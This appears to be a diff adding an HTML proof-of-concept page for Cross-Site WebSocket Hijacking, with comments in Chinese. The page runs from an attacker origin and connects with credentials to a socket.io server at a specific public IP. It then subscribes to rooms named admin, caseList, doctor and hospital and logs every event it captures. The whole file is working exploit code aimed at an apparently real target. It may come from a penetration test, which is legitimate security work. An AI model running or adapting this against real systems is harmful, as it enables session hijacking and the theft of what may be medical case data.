@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>CSWSH PoC - Cross-Site WebSocket Hijacking</title>
+<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+<style>
+body { font-family: sans-serif; padding: 20px; }
+#log { background: #000; color: #0f0; padding: 10px; font-family: monospace; white-space: pre-wrap; max-height: 600px; overflow: auto; }
+.event { background: #ffeb3b; padding: 5px; font-family: monospace; white-space: pre-wrap; margin: 5px 0; }
+</style>
+</head>
+<body>
+<h1>CSWSH PoC - Cross-Site WebSocket Hijacking @ :3100</h1>
+<p>本页面从攻击者域加载 (127.0.0.1:18080)，尝试连接到 victim 域 (35.234.50.28:3100) 的 socket.io。</p>
+<p>目标: 利用 :3100 CORS 全开 + ACAC=true，跨域订阅 admin/caseList 房间</p>
+<h2>日志</h2>
+<div id="log">[waiting...]</div>
+<h2>捕获事件</h2>
+<div id="events"></div>
+
+<script>
+const logEl = document.getElementById('log');
+const eventsEl = document.getElementById('events');
+window.__log = [];
+function log(msg) {
+  const line = `[${new Date().toISOString()}] ${msg}\n`;
+  window.__log.push(line);
+  logEl.textContent = window.__log.join('');
+  console.log(msg);
+}
+function showEvent(name, data) {
+  const div = document.createElement('div');
+  div.className = 'event';
+  div.textContent = `${new Date().toISOString()} ${name}: ${JSON.stringify(data)}`;
+  eventsEl.appendChild(div);
+}
+
+window.addEventListener('error', (e) => log(`ERROR: ${e.message} @ ${e.filename}:${e.lineno}`));
+window.addEventListener('unhandledrejection', (e) => log(`REJECTION: ${e.reason}`));
+
+async function run() {
+  log('=== CSWSH PoC START ===');
+  log(`attacker origin: ${location.origin}`);
+  log(`target socket.io: http://35.234.50.28:3100/socket.io/?EIO=4&transport=polling`);
+  
+  try {
+    log('Connecting to :3100 socket.io...');
+    const socket = io('http://35.234.50.28:3100', {
+      transports: ['polling', 'websocket'],
+      reconnection: true,
+      reconnectionAttempts: 3,
+      timeout: 10000,
+      extraHeaders: {
+        // 模拟真实浏览器 Origin 头（CORS 全开，服务器会反射）
+      },
+      withCredentials: true,
+    });
+
+    socket.on('connect', () => {
+      log(`✓ CONNECTED sid=${socket.id}`);
+      showEvent('connect', { sid: socket.id, transport: socket.io.engine.transport.name });
+
+      // 尝试订阅业务事件房间（admin/caseList 等）
+      const rooms = ['admin', 'caseList', 'monitor', 'doctor', 'hospital', 'moht'];
+      rooms.forEach(room => {
+        log(`emit client.subscribe roomName=${room}`);
+        socket.emit('client.subscribe', { roomName: room }, (ack) => {
+          log(`subscribe ack (${room}): ${JSON.stringify(ack)}`);
+          showEvent('subscribe-ack', { room, ack });
+        });
+      });
+
+      // 尝试 ping/hello 业务事件
+      socket.emit('ping', { ts: Date.now() }, (ack) => {
+        log(`ping ack: ${JSON.stringify(ack)}`);
+        showEvent('ping-ack', ack);
+      });
+    });
+
+    socket.on('disconnect', (reason) => {
+      log(`✗ DISCONNECTED reason=${reason}`);
+      showEvent('disconnect', { reason });
+    });
+
+    socket.on('connect_error', (err) => {
+      log(`✗ CONNECT_ERROR: ${err.message}`);
+      showEvent('connect_error', { message: err.message });
+    });
+
+    // 监听所有事件
+    socket.onAny((eventName, ...args) => {
+      log(`← EVENT ${eventName}: ${JSON.stringify(args).slice(0, 500)}`);
+      showEvent(eventName, args);
+    });
+  } catch (e) {
+    log(`EXCEPTION: ${e.message}\n${e.stack}`);
+  }
+}
+
+// 立即启动
+run();
+
+// 5 秒后汇总
+setTimeout(() => {
+  log('=== 5s summary ===');
+  log(`events captured: ${eventsEl.children.length}`);
+}, 5000);
+
+// 10 秒后断连
+setTimeout(() => {
+  log('=== 10s elapsed, finishing ===');
+  document.title = 'CSWSH PoC DONE';
+}, 10000);
+</script>
+</body>
+</html>
